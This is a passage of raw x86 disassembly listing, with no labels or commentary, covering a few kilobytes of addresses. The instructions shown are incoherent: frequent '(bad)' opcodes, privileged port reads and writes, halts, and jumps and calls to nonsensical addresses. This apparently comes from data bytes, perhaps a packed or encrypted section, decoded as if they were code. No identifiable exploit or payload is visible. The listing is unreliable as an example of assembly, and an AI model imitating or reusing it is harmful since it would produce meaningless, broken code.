  4110d8:	(bad)  
  4110d9:	(bad)  
  4110db:	push   es
  4110dc:	and    esp,DWORD PTR [ecx+0x6b]
  4110df:	call   0x428ead5
  4110e4:	jmp    0x411083
  4110e6:	retf   
  4110e7:	out    dx,eax
  4110e8:	fisub  DWORD PTR [ebp-0x3d]
  4110eb:	push   ebx
  4110ec:	and    eax,0xa67ee737
  4110f1:	loope  0x41109b
  4110f3:	sbb    al,0x5e
  4110f5:	jmp    0x8870:0x1e40cb66
  4110fc:	inc    ecx
  4110fd:	push   ecx
  4110fe:	out    0x3,eax
  411100:	bound  esp,QWORD PTR [edx-0x5c]
  411103:	sti    
  411104:	and    al,BYTE PTR [edx-0xe]
  411107:	out    0x24,al
  411109:	popa   
  41110a:	mov    ds:0x6b6041e7,eax
  41110f:	call   0x428eafd
  411114:	jmp    0xc58600b5
  411119:	aam    0xca
  41111b:	dec    edx
  41111c:	ficomp DWORD PTR [ebp-0x35]
  41111f:	ja     0x4110de
  411121:	ss out 0x7e,eax
  411124:	push   ds
  411125:	loope  0x41114f
  411127:	sbb    al,0x4a
  411129:	cli    
  41112a:	es jge 0x41110e
  41112d:	std    
  41112e:	push   edi
  41112f:	add    al,0x62
  411131:	fldenv [edx+0x46]
  411134:	mov    ds:0xa4e6ee41,al
  411139:	pusha  
  41113a:	arpl   di,sp
  41113c:	add    cl,ah
  41113e:	(bad)  
  411140:	add    ebp,ecx
  411142:	sbb    ebp,DWORD PTR [eax-0x5105a2e5]
  411148:	jl     0x41112b
  41114a:	std    
  41114b:	outs   dx,DWORD PTR ds:[esi]
  41114c:	add    esp,DWORD PTR [edx-0x27]
  41114f:	add    BYTE PTR [edx-0x59],ah
  411152:	sbb    eax,ebp
  411154:	jecxz  0x411192
  411156:	pop    ds
  411157:	xchg   DWORD PTR [ebp+0x45],ebp
  41115a:	push   edx
  41115b:	add    cl,ch
  41115d:	popa   
  41115e:	(bad)  
  411160:	test   al,0x59
  411162:	shl    BYTE PTR [ecx],cl
  411164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411165:	mov    dh,0x5a
  411167:	and    al,0x49
  411169:	popa   
  41116a:	fld    DWORD PTR [eax]
  41116c:	jb     0x4111d5
  41116e:	sbb    edi,esp
  411170:	out    0x4,al
  411172:	daa    
  411173:	mov    DWORD PTR [ebx-0x1602c9f6],ebp
  411179:	or     eax,eax
  41117b:	add    bh,BYTE PTR [esi+0x1acd9c60]
  411181:	push   ecx
  411182:	sub    DWORD PTR gs:[ecx+0x7000d95c],0xe9c4fa6d
  41118d:	popa   
  41118e:	fld    DWORD PTR [edi-0x784e3a53]
  411194:	ins    DWORD PTR es:[edi],dx
  411195:	mov    ebp,0x61e90079
  41119a:	pusha  
  41119b:	mov    esp,0xfd367dc5
  4111a0:	jmp    0x24b34fa5
  4111a5:	sub    eax,0x7000d961
  4111aa:	std    
  4111ab:	stc    
  4111ac:	js     0x411220
  4111ae:	pop    ds
  4111af:	jno    0x4111b1
  4111b1:	jmp    0x2862ea97
  4111b6:	in     eax,dx
  4111b7:	clc    
  4111b8:	cmp    ebp,ecx
  4111ba:	popa   
  4111bb:	pop    ecx
  4111bc:	add    BYTE PTR [ebp+0x60],dl
  4111bf:	hlt    
  4111c0:	add    cl,ch
  4111c2:	popa   
  4111c3:	fdiv   DWORD PTR [edx+eax*1-0x2c]
  4111c7:	inc    eax
  4111c8:	out    0x0,eax
  4111ca:	jmp    0x4304:0x680000e2
  4111d1:	mov    DWORD PTR [edi+0x4b00a541],esi
  4111d7:	fldl2t 
  4111d9:	and    dl,al
  4111db:	sbb    al,0x5
  4111dd:	test   edx,edi
  4111df:	push   ecx
  4111e0:	adc    BYTE PTR [ebx],dh
  4111e2:	lock cwde 
  4111e4:	in     eax,0x17
  4111e6:	mov    BYTE PTR [esi],bh
  4111e8:	ret    0xbf89
  4111eb:	inc    ecx
  4111ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111ed:	add    BYTE PTR [ebx],bh
  4111ef:	fldl2t 
  4111f1:	or     bl,al
  4111f3:	add    eax,0x41478943
  4111f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111f9:	add    bl,bh
  4111fb:	fdiv   DWORD PTR [edi-0x2b70500]
  411201:	test   BYTE PTR [edx],bh
  411203:	dec    esp
  411204:	add    al,0x8b
  411206:	add    BYTE PTR [esi+0x7002ea30],bh
  41120c:	fwait
  41120d:	and    al,cl
  41120f:	scas   eax,DWORD PTR es:[edi]
  411210:	inc    edx
  411211:	cmp    al,0x0
  411213:	retf   
  411214:	sub    ch,bh
  411216:	jae    0x411217
  411218:	and    edi,ebp
  41121a:	call   FWORD PTR [ebx-0x59c68b28]
  411220:	fadd   DWORD PTR [eax]
  411222:	xor    bl,cl
  411224:	dec    esp
  411225:	sub    bh,BYTE PTR ds:0x40d8cb
  41122b:	das    
  41122c:	ss cmp al,0x0
  41122f:	mov    ebx,0x3f74fd68
  411234:	push   ebx
  411235:	call   FWORD PTR [edx+0x2]
  411238:	imul   esp,DWORD PTR [ecx],0x21894260
  41123e:	les    edi,FWORD PTR [ebx-0x28]
  411241:	add    BYTE PTR [edx+eiz*2-0x4],dh
  411245:	sbb    al,BYTE PTR [esi+eiz*2+0x41]
  411249:	xchg   ebp,eax
  41124a:	inc    edi
  41124b:	clc    
  41124c:	outs   dx,BYTE PTR ds:[esi]
  41124d:	sbb    ch,BYTE PTR [esi]
  41124f:	pop    esp
  411250:	inc    edx
  411251:	add    DWORD PTR [ecx+0x13d68],edi
  411257:	dec    ecx
  411258:	cmp    ebx,DWORD PTR [ebx-0x64bfc6f7]
  41125e:	or     al,0xab
  411260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411261:	xor    BYTE PTR [eax-0x7f5ed962],cl
  411267:	cmp    esp,DWORD PTR [ebx+0x1]
  41126a:	add    BYTE PTR [eax],al
  41126c:	(bad)  
  41126d:	fdivr  st(7),st
  41126f:	mov    ah,BYTE PTR [ebx]
  411271:	or     DWORD PTR [ecx],0xe9062507
  411277:	arpl   WORD PTR [eax+0x42],sp
  41127a:	add    DWORD PTR [eax],eax
  41127c:	fiadd  DWORD PTR [ebp-0x7a258c1b]
  411282:	in     eax,0x74
  411284:	or     DWORD PTR [ebx+0x48],edx
  411287:	inc    ebx
  411288:	ds push ds
  41128a:	add    al,BYTE PTR [eax]
  41128c:	bound  eax,QWORD PTR [edx+0x79]
  41128f:	dec    ebx
  411290:	outs   dx,BYTE PTR ds:[esi]
  411292:	sbb    al,0xa8
  411294:	jmp    0xc2c40c1d
  411299:	cmp    bh,BYTE PTR [edx-0x7d]
  41129c:	xchg   dl,dl
  41129e:	add    DWORD PTR [eax],eax
  4112a0:	bound  esp,QWORD PTR [edi+0x41462385]
  4112a6:	add    DWORD PTR [eax],eax
  4112a8:	fist   DWORD PTR [edi+0x4]
  4112ab:	pop    edi
  4112ac:	mov    ch,0xda
  4112ae:	add    BYTE PTR [edi-0x4483efe1],dh
  4112b4:	inc    esi
  4112b5:	data16 add al,BYTE PTR [eax]
  4112b8:	bound  edx,QWORD PTR [edi]
  4112ba:	or     esp,DWORD PTR [ebp-0x19]
  4112bd:	fsub   DWORD PTR [edi-0x509fb868]
  4112c3:	jnp    0x411269
  4112c5:	mov    esi,0x2c166cea
  4112ca:	int3   
  4112cb:	retf   
  4112cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112cd:	mov    ah,0xf7
  4112cf:	add    BYTE PTR [eax],0xea
  4112d2:	fst    DWORD PTR [edx+0xf]
  4112d5:	pusha  
  4112d6:	pop    esi
  4112d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112d8:	inc    ebp
  4112d9:	inc    edx
  4112da:	fsubr  DWORD PTR [esi+0x2bb6b1f9]
  4112e0:	add    al,0xd9
  4112e2:	inc    ecx
  4112e3:	jo     0x411285
  4112e5:	or     DWORD PTR [ebp-0x2551de94],0x483a0a01
  4112ef:	in     al,dx
  4112f0:	add    esp,DWORD PTR [edx+0x5e]
  4112f3:	sbb    ebp,eax
  4112f5:	mov    ebp,0x3de82b1a
  4112fa:	fsub   st,st(7)
  4112fc:	add    esp,DWORD PTR [edx+0x3e]
  4112ff:	bnd jp 0x4112bb
  411302:	std    
  411303:	mov    DWORD PTR [edx+eiz*2],0x41a060d9
  41130a:	lea    ebx,[eax+ecx*1+0x2d]
  41130e:	push   eax
  41130f:	rol    DWORD PTR [edx],1
  411311:	mov    ebp,DWORD PTR [edx]
  411313:	inc    eax
  411314:	add    DWORD PTR [ecx],0xfffffffe
  411317:	addr16 add al,0x62
  41131a:	(bad)  
  41131c:	sbb    cl,0xfd
  41131f:	xor    eax,DWORD PTR [edx+eiz*2]
  411322:	fstp   DWORD PTR [esi]
  411324:	jnp    0x41134f
  411326:	std    
  411327:	out    dx,eax
  411328:	jl     0x411363
  41132a:	std    
  41132b:	scas   eax,DWORD PTR es:[edi]
  41132c:	jl     0x41134f
  41132e:	std    
  41132f:	mov    ds:0xd798ecfe,eax
  411334:	add    BYTE PTR [eax],0x61
  411337:	pushf  
  411338:	add    bl,ch
  41133a:	popa   
  41133b:	fld    DWORD PTR [eax]
  41133d:	mov    dl,0xe5
  41133f:	mul    BYTE PTR [eax+ebp*8+0x61]
  411343:	(bad)  ds:0x8461252e
  411349:	or     eax,0xe9fd3256
  41134e:	fiadd  DWORD PTR [ebp+0x74]
  411351:	cli    
  411352:	idiv   dh
  411354:	ret    0x9efa
  411357:	or     eax,edi
  411359:	fs and eax,0x61e90075
  41135f:	fnstcw WORD PTR [edi]
  411361:	jmp    0x6265:0x6cc8ff72
  411368:	add    DWORD PTR [esi+0x1bf8ee5d],0x860d5730
  411372:	loopne 0x4113b6
  411374:	add    al,0xc2
  411376:	imul   esp,DWORD PTR [edi-0xa3a9d0a],0xf5ed6260
  411380:	push   esp
  411381:	jb     0x411348
  411383:	cmc    
  411384:	sbb    BYTE PTR [edx-0x13],ch
  411387:	cmc    
  411388:	xor    cl,ch
  41138a:	fiadd  DWORD PTR [eax]
  41138c:	imul   DWORD PTR [eax+0xa74d7ed]
  411392:	in     eax,0x6a
  411394:	aas    
  411395:	aad    0xdc
  411397:	imul   edx,eax,0x28
  41139a:	add    BYTE PTR [ecx-0x26],bh
  41139d:	or     DWORD PTR [ecx+0x66],0xcdcd5460
  4113a4:	pusha  
  4113a5:	inc    esp
  4113a6:	lds    esp,FWORD PTR [ebp-0x629df35b]
  4113ac:	cmc    
  4113ad:	js     0x41138d
  4113af:	pop    ss
  4113b0:	(bad)  
  4113b1:	adc    BYTE PTR [eax],al
  4113b3:	xor    ch,BYTE PTR [edx+0x21]
  4113b6:	adc    al,0x95
  4113b8:	adc    eax,0x41170409
  4113bd:	push   cs
  4113be:	mov    bh,0xba
  4113c0:	sub    ecx,DWORD PTR [esi]
  4113c2:	mov    dh,0xd3
  4113c4:	xchg   ebp,eax
  4113c5:	in     eax,0x8
  4113c7:	or     ch,bh
  4113c9:	add    BYTE PTR [ecx-0x74d6beb9],cl
  4113cf:	inc    edi
  4113d0:	inc    ecx
  4113d1:	or     eax,0x3d412f89
  4113d6:	pmullw mm4,QWORD PTR [ecx+0x5]
  4113da:	add    BYTE PTR [edx-0x23],cl
  4113dd:	add    BYTE PTR [ecx-0x7ec6be79],cl
  4113e3:	xchg   edi,eax
  4113e4:	inc    ecx
  4113e5:	pop    ecx
  4113e6:	add    DWORD PTR [ebx-0x23],ecx
  4113e9:	add    BYTE PTR [eax],al
  4113eb:	dec    ebx
  4113ec:	(bad)  [ecx-0x276d86c]
  4113f2:	(bad)  
  4113f3:	cmp    esi,DWORD PTR [edx-0x4bc0db87]
  4113f9:	jns    0x41141f
  4113fb:	cmp    ebx,DWORD PTR [eax-0x14]
  4113fe:	je     0x411400
  411400:	(bad)  
  411401:	mov    cl,0x81
  411403:	and    al,0xb3
  411405:	aad    0x0
  411407:	add    BYTE PTR [esi+0xb0083d9],cl
  41140d:	fld    QWORD PTR [eax]
  41140f:	add    ecx,DWORD PTR [esi+0x22]
  411412:	call   0xcc536e8a
  411417:	dec    ecx
  411418:	mov    dl,ah
  41141a:	inc    DWORD PTR [eax+0x40]
  41141d:	loopne 0x4113a1
  41141f:	enter  0xca7c,0xaa
  411423:	mov    ebx,DWORD PTR [edi-0x1074a2c8]
  411429:	cmp    BYTE PTR [ecx-0x75],dl
  41142c:	bound  ebp,QWORD PTR [esi+0x4262b3e8]
  411432:	add    DWORD PTR [ebx-0x7d12e1da],ecx
  411438:	push   ds
  411439:	push   ss
  41143a:	leave  
  41143b:	call   DWORD PTR [ecx]
  41143d:	dec    ecx
  41143e:	js     0x41143d
  411440:	dec    ecx
  411441:	xor    al,0x90
  411443:	push   edx
  411444:	fistp  WORD PTR [ebx]
  411446:	xchg   ebp,eax
  411447:	and    edi,DWORD PTR [ebp-0x7a]
  41144a:	call   0xe93ffb72
  41144f:	addr16 adc dh,ah
  411452:	ja     0x411426
  411454:	fldenv [edi+0x19]
  411457:	add    DWORD PTR [ecx+0x41],esi
  41145a:	add    DWORD PTR [ebx-0x7b5b214a],ecx
  411460:	and    ah,ch
  411462:	aam    0x8a
  411464:	add    dh,ch
  411466:	sbb    eax,0x423dff55
  41146b:	sbb    BYTE PTR [ecx],ah
  41146d:	jmp    0xd9a4fd67
  411472:	sbb    eax,0xffffffc0
  411475:	imul   ebx,DWORD PTR [edx-0x6c],0xc736e815
  41147c:	inc    ebx
  41147d:	ds cs xchg esi,eax
  411480:	or     eax,0x7402a8e1
  411485:	push   esp
  411486:	lods   al,BYTE PTR ds:[esi]
  411487:	les    eax,FWORD PTR [eax]
  411489:	cmp    BYTE PTR [esi-0x1b],dh
  41148c:	je     0x4114fc
  41148e:	cmp    eax,0x13e83ac4
  411493:	push   edx
  411494:	mov    dh,BYTE PTR [esi-0x22]
  411497:	mov    eax,0xb0d5f68a
  41149c:	add    BYTE PTR [edx+0x42],ah
  41149f:	xchg   cl,dl
  4114a1:	pop    ebp
  4114a2:	mov    ch,0x14
  4114a4:	inc    ebp
  4114a6:	fsub   st,st(7)
  4114a8:	js     0x4114d3
  4114aa:	cmc    
  4114ab:	xrelease xchg BYTE PTR [edx+0x11caa9b0],ch
  4114b2:	cmc    
  4114b3:	mov    ds:0xfef47097,eax
  4114b8:	sti    
  4114b9:	loopne 0x4114f4
  4114bb:	out    0x3,eax
  4114bd:	bound  esp,QWORD PTR [eax+edx*1-0x4]
  4114c1:	xlat   BYTE PTR ds:[ebx]
  4114c2:	fisub  WORD PTR [edx-0x39]
  4114c5:	inc    ecx
  4114c6:	mov    cl,0xf6
  4114c8:	push   ecx
  4114c9:	add    BYTE PTR [ecx-0x26],ah
  4114cc:	and    al,BYTE PTR [edi+0x64]
  4114cf:	push   ebp
  4114d0:	mov    ds:0x25d96204,eax
  4114d5:	iret   
  4114d6:	ins    BYTE PTR es:[edi],dx
  4114d7:	stos   BYTE PTR es:[edi],al
  4114d8:	iret   
  4114d9:	sbb    eax,0x3e7da23
  4114de:	gs addr16 in eax,dx
  4114e1:	into   
  4114e2:	and    bl,bh
  4114e4:	arpl   WORD PTR [ebx+0x45],dx
  4114e7:	das    
  4114e8:	out    0xc1,eax
  4114ea:	js     0x411512
  4114ec:	sbb    DWORD PTR [edx+ecx*2],edx
  4114ef:	jge    0x4114d8
  4114f1:	add    esp,DWORD PTR [edx+0x5a]
  4114f4:	dec    ebx
  4114f5:	loopne 0x411530
  4114f7:	(bad)  
  4114f9:	add    esp,DWORD PTR [edx-0x22]
  4114fc:	arpl   WORD PTR [ebx+0x15],bp
  4114ff:	das    
  411500:	out    0x7e,eax
  411502:	loope  0x4114f9
  411504:	aaa    
  411505:	add    al,0x62
  411507:	fldl2e 
  411509:	jg     0x41154c
  41150b:	xchg   ecx,eax
  41150c:	call   0x58337714
  411511:	sti    
  411512:	out    0x60,eax
  411514:	out    0x3,eax
  411516:	(bad)
  41151b:	push   esp
  41151c:	and    dl,BYTE PTR [eax+0x7d00f289]
  411522:	ret    0x7e
  411525:	jmp    0x268fbc8b
  41152a:	sar    dl,cl
  41152c:	and    al,0x6c
  41152e:	add    BYTE PTR [edx+0x58b968fa],ah
  411534:	push   0x24
  411536:	push   ecx
  411537:	pop    esi
  411538:	fld    DWORD PTR [eax]
  41153a:	jb     0x411591
  41153c:	arpl   si,cx
  41153e:	adc    DWORD PTR [edi],esp
  411540:	enter  0xe8ff,0xc
  411544:	xchg   edx,eax
  411545:	and    al,0x89
  411547:	loop   0x4115b7
  411549:	jae    0x411566
  41154b:	pop    ebp
  41154c:	add    ecx,DWORD PTR [edx+0x7e9565]
  411552:	jmp    0x58d77b8
  411557:	ret    0xbfdb
  41155a:	add    dh,BYTE PTR [esi-0x58]
  41155d:	sbb    dh,BYTE PTR [edx-0x6d]
  411560:	add    edx,eax
  411562:	arpl   WORD PTR [edi-0xd],sp
  411565:	inc    esp
  411566:	add    eax,0x6a0ea4f2
  41156b:	outs   dx,BYTE PTR ds:[esi]
  41156c:	fnstenv [edi+ebp*8-0x49]
  411570:	cwde   
  411571:	call   edx
  411573:	in     eax,dx
  411574:	stc    
  411575:	jae    0x41158c
  411577:	arpl   WORD PTR [edi+0x4df77e39],dx
  41157d:	mov    DWORD PTR [ebp+0x35],edx
  411580:	xchg   edx,eax
  411581:	(bad)  
  411582:	call   0xc5ad77e8
  411587:	mov    ch,0xad
  411589:	jle    0x4115f1
  41158b:	cli    
  41158c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41158d:	adc    al,0x6a
  41158f:	fnstenv fs:[esp+ebp*8+0x0]
  411594:	in     al,0x32
  411596:	add    dl,ah
  411598:	out    0xf2,eax
  41159a:	cmc    
  41159b:	add    BYTE PTR [eax],bl
  41159d:	fadd   DWORD PTR [eax+0x48d13e]
  4115a3:	inc    esi
  4115a4:	inc    eax
  4115a5:	jbe    0x4115c8
  4115a7:	adc    BYTE PTR [edx+0x76],al
  4115aa:	and    DWORD PTR [esi+ecx*2],ebx
  4115ad:	in     al,0x74
  4115af:	jne    0x411573
  4115b1:	mov    ebp,0xd9bbc421
  4115b6:	add    BYTE PTR [ebp+0x27],dh
  4115b9:	scas   eax,DWORD PTR es:[edi]
  4115ba:	push   ecx
  4115bb:	and    al,0xcb
  4115bd:	pop    eax
  4115be:	iret   
  4115bf:	js     0x4115a0
  4115c1:	scas   al,BYTE PTR es:[edi]
  4115c2:	ret    0x3d2b
  4115c5:	and    ebp,esp
  4115c7:	add    edi,DWORD PTR [ebx-0x27]
  4115ca:	jnp    0x411625
  4115cc:	pop    eax
  4115cd:	repnz cmp BYTE PTR [edi+ebx*2+0x29],cl
  4115d2:	push   cs
  4115d3:	popf   
  4115d4:	mov    edx,0x473bced3
  4115d9:	cmp    DWORD PTR [ecx],esi
  4115db:	jbe    0x411570
  4115dd:	push   esi
  4115de:	jns    0x411604
  4115e0:	addr16 aad 0x74
  4115e3:	push   ds
  4115e4:	push   eax
  4115e5:	out    dx,al
  4115e6:	push   cs
  4115e7:	sub    DWORD PTR [edx-0x4fffff28],0x61
  4115ee:	and    DWORD PTR [esp+eax*2],edi
  4115f1:	mov    eax,DWORD PTR [eax]
  4115f3:	inc    ecx
  4115f4:	adc    BYTE PTR [edi+0x10002071],dl
  4115fa:	call   0xf06f:0xee201c71
  411601:	lock sub bh,BYTE PTR [edx]
  411604:	retf   
  411605:	add    al,0x56
  411607:	jb     0x41160a
  411609:	sti    
  41160a:	fmul   DWORD PTR ds:0x3a180ab6
  411610:	ret    0xdb0f
  411613:	cmp    ebx,ecx
  411615:	bound  edx,QWORD PTR [eax]
  411617:	or     eax,0xcc7963ea
  41161c:	retf   0xbf6d
  41161f:	test   al,0x0
  411621:	bound  eax,QWORD PTR [edx+0x7a]
  411624:	dec    ebx
  411625:	xchg   BYTE PTR [esi],ch
  411627:	jl     0x4115bc
  411629:	jle    0x4115d9
  41162b:	add    al,0x0
  41162d:	bound  ecx,QWORD PTR [edi]
  41162f:	push   ss
  411630:	push   esp
  411631:	pcmpgtw mm1,QWORD PTR [eax]
  411634:	mov    bl,0x86
  411636:	mov    BYTE PTR [eax+eax*1],0x62
  41163a:	(bad)  
  41163b:	shl    BYTE PTR [ebx],0x3a
  41163e:	push   edx
  41163f:	fwait
  411640:	add    DWORD PTR [edi],ebp
  411642:	inc    esp
  411643:	jl     0x411612
  411645:	fucomi st,st(6)
  411647:	loopne 0x411620
  411649:	bound  eax,QWORD PTR [edx+0x1]
  41164c:	mov    DWORD PTR [esi+0x75ff24de],esi
  411652:	inc    edx
  411653:	jp     0x4116c0
  411655:	inc    esi
  411656:	call   0x8a08:0x1b9f2e1c
  41165d:	add    BYTE PTR [edx-0x27],bl
  411660:	pop    eax
  411661:	and    edi,esi
  411663:	inc    ecx
  411664:	add    DWORD PTR [eax],eax
  411666:	(bad)  
  411667:	adc    BYTE PTR [ebx+eax*2+0x7e],bh
  41166b:	loop   0x4116ea
  41166d:	mov    edi,0x2380fe6d
  411672:	and    al,BYTE PTR [edx+0x1]
  411675:	add    bl,bl
  411677:	std    
  411678:	loopne 0x411699
  41167a:	jecxz  0x4116d6
  41167c:	jmp    0x411679
  41167e:	sbb    eax,0x1483f853
  411683:	inc    edx
  411684:	add    DWORD PTR [eax],eax
  411686:	jecxz  0x41162a
  411688:	in     al,dx
  411689:	sti    
  41168a:	add    eax,0xba2b8dbb
  41168f:	fadd   DWORD PTR [ebx]
  411691:	or     ah,dh
  411693:	sub    esp,DWORD PTR [edx]
  411695:	or     al,0x71
  411697:	shl    esi,1
  411699:	jns    0x411695
  41169b:	fsub   st,st(7)
  41169d:	add    esp,ebx
  41169f:	sub    esp,ebp
  4116a1:	pop    es
  4116a2:	aam    0x2b
  4116a4:	mov    ebp,0xe62be6ee
  4116a9:	jle    0x411655
  4116ab:	fsub   st,st(7)
  4116ad:	add    ecx,ecx
  4116af:	fbstp  TBYTE PTR [edx+0x57]
  4116b2:	xor    DWORD PTR [ecx-0x19],0x5f06203
  4116b9:	mov    fs,WORD PTR [eax+0x5e]
  4116bc:	jge    0x4116c0
  4116be:	jmp    0xe4e24f
  4116c3:	call   0x8d90da0c
  4116c8:	sub    esp,edi
  4116ca:	aam    0x84
  4116cc:	icebp  
  4116cd:	imul   ebx,edi,0x35
  4116d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116d1:	inc    ecx
  4116d2:	sbb    DWORD PTR [eax+0x73cb0ba4],0xf10739a7
  4116dc:	hlt    
  4116dd:	add    edi,DWORD PTR [ecx-0x5f]
  4116e0:	cmc    
  4116e1:	dec    edi
  4116e2:	mov    ah,0xb3
  4116e4:	pop    esi
  4116e5:	call   0x62f4:0x33421f7b
  4116ec:	fldenv [esp+eax*2+0x6c]
  4116f0:	push   esp
  4116f1:	out    dx,al
  4116f2:	add    al,0x62
  4116f4:	fnstenv [edx-0x58]
  4116f7:	cmp    DWORD PTR [ecx+0x65817062],0x3e6203e7
  411701:	sar    DWORD PTR [edx-0x57],1
  411704:	cmc    
  411705:	add    edi,DWORD PTR [ebx+0x23]
  411708:	inc    DWORD PTR [eax]
  41170a:	test   al,0x19
  41170c:	cmp    esi,DWORD PTR [ebp-0x31]
  41170f:	jnp    0x4116e5
  411711:	cmp    ch,BYTE PTR [ebp-0x88c58eb]
  411717:	loopne 0x41174a
  411719:	jmp    ebp
  41171b:	gs or  eax,0x5f61e900
  411721:	inc    esi
  411722:	call   0xb465add2
  411727:	add    ah,dl
  411729:	push   esi
  41172a:	shr    cl,1
  41172c:	popa   
  41172d:	(bad)  [ecx+0x24aeaf34]
  411733:	fldcw  WORD PTR [ebp+edx*2-0x269e163c]
  41173a:	mov    DWORD PTR [ebp+0x139da85],ebp
  411740:	xchg   ebp,eax
  411741:	push   ebx
  411742:	mov    eax,0x80d961e9
  411747:	jl     0x4117ad
  411749:	fnsave [ebx-0x3f]
  41174c:	cwde   
  41174d:	xor    dh,BYTE PTR [ecx-0x3b]
  411750:	loope  0x4116ff
  411752:	add    bl,dh
  411754:	ror    ah,cl
  411756:	mov    DWORD PTR ds:0x29f6c282,esp
  41175c:	push   0xffffffca
  41175e:	jae    0x411755
  411760:	loopne 0x411790
  411762:	(bad)  
  411763:	cmp    al,0x5a
  411765:	push   edi
  411766:	stc    
  411767:	jmp    0x411746
  411769:	rol    BYTE PTR [ecx+0x2b64235],cl
  41176f:	xor    al,0x61
  411771:	pop    esp
  411772:	jae    0x41175c
  411774:	outs   dx,BYTE PTR ds:[esi]
  411776:	and    al,0x85
  411778:	popa   
  411779:	fld    DWORD PTR [eax]
  41177b:	(bad)  
  41177c:	int    0xf5
  41177e:	push   esp
  41177f:	and    cl,0x2d
  411782:	std    
  411783:	add    ah,bl
  411785:	push   es
  411786:	(bad)  
  411787:	jmp    0x411796
  411789:	scas   eax,DWORD PTR es:[edi]
  41178a:	cld    
  41178b:	xor    eax,DWORD PTR [eax]
  41178d:	test   DWORD PTR [edx+edi*1-0x2],ebp
  411791:	imul   DWORD PTR ds:0xe162ff80
  411797:	(bad)  
  411798:	call   DWORD PTR [esi]
  41179a:	dec    ebp
  41179b:	mov    bl,BYTE PTR [edi+edx*2-0x34ffff87]
  4117a2:	sbb    al,0x69
  4117a4:	and    al,0x73
  4117a6:	dec    ecx
  4117a7:	dec    edx
  4117a8:	and    DWORD PTR [eax],0x2a
  4117ab:	jns    0x4117d1
  4117ad:	sub    bl,BYTE PTR ds:[eax+edi*8+0x50fed38c]
  4117b5:	xor    BYTE PTR [edx+0x21],ch
  4117b8:	pop    eax
  4117b9:	cmp    BYTE PTR [esi-0x55bfaffb],dl
  4117bf:	and    DWORD PTR [eax-0x76],ebp
  4117c2:	aad    0x0
  4117c4:	or     DWORD PTR [ebx+0x2e],0x4d
  4117c8:	push   DWORD PTR [esi+0x7b401371]
  4117ce:	push   esi
  4117cf:	ror    DWORD PTR [eax+eax*1],0xaa
  4117d3:	and    DWORD PTR [eax+0x3900d58b],eax
  4117d9:	out    dx,eax
  4117da:	cmp    ch,al
  4117dc:	add    BYTE PTR [ebx-0x2b],bh
  4117df:	mov    DWORD PTR [edi+eiz*2+0x69],ecx
  4117e3:	push   cs
  4117e4:	dec    edi
  4117e5:	add    eax,0xbb2481a5
  4117ea:	fld    QWORD PTR [eax]
  4117ec:	add    BYTE PTR [ecx+edi*1],cl
  4117ef:	dec    ebp
  4117f0:	arpl   WORD PTR [eax],ax
  4117f2:	xchg   ebp,ebx
  4117f4:	aaa    
  4117f5:	lods   al,BYTE PTR ds:[esi]
  4117f6:	daa    
  4117f7:	pop    ebp
  4117f8:	std    
  4117f9:	(bad)  
  4117fa:	cmp    ebx,DWORD PTR [ecx+0x5c]
  4117fd:	mov    esp,DWORD PTR [edx+0x75]
  411800:	pop    ss
  411801:	fs jmp 0xe950f8fd
  411807:	into   
  411808:	loopne 0x41185d
  41180a:	loope  0x411832
  41180c:	frstor [edi]
  41180e:	bound  esp,QWORD PTR [esi]
  411810:	stc    
  411811:	mov    ch,BYTE PTR [edi]
  411813:	mov    eax,0x76814fed
  411818:	add    DWORD PTR [edx-0xa],ebp
  41181b:	sbb    bh,BYTE PTR [esi-0x2]
  41181e:	outs   dx,BYTE PTR ds:[esi]
  41181f:	cmp    cl,al
  411821:	not    DWORD PTR [esi+0x3e]
  411824:	js     0x4117ec
  411826:	leave  
  411827:	gs js  0x41187d
  41182a:	xchg   dl,dl
  41182c:	jge    0x4117ff
  41182e:	dec    esi
  41182f:	fdivr  DWORD PTR [edi-0x45]
  411832:	xchg   BYTE PTR [esi],bl
  411834:	add    al,BYTE PTR [eax]
  411836:	bound  esi,QWORD PTR [ecx]
  411838:	and    DWORD PTR [edx+0x79],0xffffffae
  41183c:	loopne 0x41188d
  41183e:	arpl   WORD PTR [edx],si
  411840:	add    DWORD PTR [ebx+0xa11eee],ecx
  411846:	bound  esi,QWORD PTR [edx]
  411848:	fcomp  DWORD PTR [ebx+0x24246]
  41184e:	bound  edi,QWORD PTR [ecx+0x3e1b88f1]
  411854:	sbb    BYTE PTR [esi+0x0],al
  411857:	loope  0x4118c3
  411859:	add    al,0xea
  41185b:	and    BYTE PTR [ebx+0x329a237d],ch
  411861:	add    DWORD PTR [eax],eax
  411863:	sti    
  411864:	fiadd  DWORD PTR [edx-0x30]
  411867:	pop    edx
  411868:	mov    bl,0x8
  41186a:	add    edi,ecx
  41186c:	ds js  0x411833
  41186f:	cmp    ebp,ebx
  411871:	ja     0x4117fe
  411873:	xchg   BYTE PTR [edx-0x269dffff],ch
  411879:	shl    BYTE PTR [edi-0x7f],cl
  41187c:	imul   esp,edi,0x7b546203
  411882:	fistp  QWORD PTR [ebp-0x14fc1826]
  411888:	shl    BYTE PTR [edx+0x77],cl
  41188b:	inc    ecx
  41188c:	gs out 0x3,eax
  41188f:	(bad)  
  411890:	hlt    
  411891:	arpl   di,bx
  411893:	int    0xd8
  411895:	out    0x3,eax
  411897:	jmp    0x41182b
  411899:	jmp    0x4118b3
  41189b:	pusha  
  41189c:	mov    bl,0x5d
  41189e:	stos   DWORD PTR es:[edi],eax
  41189f:	test   BYTE PTR [edi+0x1ce2a8b4],al
  4118a5:	or     eax,DWORD PTR [ebx]
  4118a7:	(bad)  
  4118a8:	fldcw  WORD PTR [ecx]
  4118aa:	jmp    0x411879
  4118ac:	mov    dl,BYTE PTR [ebp-0x23d82d88]
  4118b2:	jecxz  0x411907
  4118b4:	cdq    
  4118b5:	out    0x78,eax
  4118b7:	lea    edx,[ebx-0x4b]
  4118ba:	inc    DWORD PTR [eax]
  4118bc:	lods   al,BYTE PTR ds:[esi]
  4118bd:	in     eax,dx
  4118be:	pop    ss
  4118bf:	xchg   ecx,eax
